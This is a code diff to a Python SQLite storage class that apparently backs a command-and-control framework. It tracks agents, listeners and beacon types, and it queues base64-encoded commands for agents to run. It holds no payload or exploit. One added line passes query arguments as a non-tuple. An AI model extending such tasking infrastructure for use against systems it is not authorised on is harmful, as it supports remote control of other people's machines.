@@ -1,5 +1,6 @@
 from os import path
 from core.logger import *
+from base64 import b64encode
 from datetime import datetime
 from sqlite3 import Error, connect
 
@@ -34,6 +35,22 @@ class Stash :
         conn.commit()
         conn.close()
 
+    def sql_get_stash(self, sql_query , sql_values=None):
+        conn = self.create_connection()
+        result = []
+        try:
+            c = conn.cursor()
+            if sql_values != None:
+                c.execute(sql_query , sql_values)
+            else:
+                c.execute(sql_query)
+            result = c.fetchall()
+        except Error as e:
+            error(e)
+
+        conn.close()
+        return result
+
     def db_init(self):
         self.sql_stash( """ PRAGMA foreign_keys = ON; """ )
 
@@ -44,7 +61,8 @@ class Stash :
             remote_ip TEXT, \
             hostname TEXT, \
             beacon_type TEXT, \
-            enc_key TEXT); """)
+            enc_key TEXT, \
+            alive BOOLEAN); """)
 
         self.sql_stash(""" CREATE TABLE IF NOT EXISTS commands (
             command_code TEXT PRIMARY KEY, \
@@ -119,6 +137,19 @@ class Stash :
 
         conn.close()
 
+    def set_agent_job(self, code, agent, cmd):
+        conn = self.create_connection()
+        b64cmd = b64encode(cmd.encode()).decode()
+        try:
+            c = conn.cursor()
+            c.execute( 'INSERT INTO commands(command_code, agent_name, command) VALUES(?, ?, ?)', ( code, agent, b64cmd ) )
+            c.execute( 'INSERT INTO commands_history(command_code,agent_name,command,output) VALUES(?, ?, ?, ?)', ( code, agent, cmd, "" ))
+            conn.commit()
+        except Error as e:
+            error(e)
+
+        conn.close()
+
     def get_listeners(self):
         conn = self.create_connection()
         result = ''
@@ -137,7 +168,7 @@ class Stash :
         result = ''
         try:
             c = conn.cursor()
-            c.execute( 'SELECT agent_name,hostname FROM agents' )
+            c.execute( 'SELECT agent_name,hostname FROM agents WHERE alive = True' )
             result = c.fetchall()
         except Error as e:
             error(e)
@@ -146,17 +177,29 @@ class Stash :
         return result
 
     def get_agents_comm_list(self, agent):
-        conn = self.create_connection()
-        result = ''
-        try:
-            c = conn.cursor()
-            c.execute( 'SELECT command,output FROM commands_history WHERE agent_name = ?' , ( agent, ) )
-            result = c.fetchall()
-        except Error as e:
-            error(e)
+        # conn = self.create_connection()
+        # result = ''
+        # try:
+        #     c = conn.cursor()
+        #     c.execute( 'SELECT command,output FROM commands_history WHERE agent_name = ?' , ( agent, ) )
+        #     result = c.fetchall()
+        # except Error as e:
+        #     error(e)
 
-        conn.close()
-        return result
+        # conn.close()
+        query = 'SELECT command,output FROM commands_history WHERE agent_name = ? ;'
+        args = ( agent, )
+        result = self.sql_get_stash( query, args )
+        return result[::-1]
+
+    def get_agent_from_comm(self, comm):
+        query = 'SELECT agent_name FROM commands WHERE command_code = ? ;'
+        args = ( comm )
+        return self.sql_get_stash( query, args )
+
+    def get_command_codes(self):
+        query = 'SELECT command_code FROM commands_history ;'
+        return self.sql_get_stash( query )
 
 
 
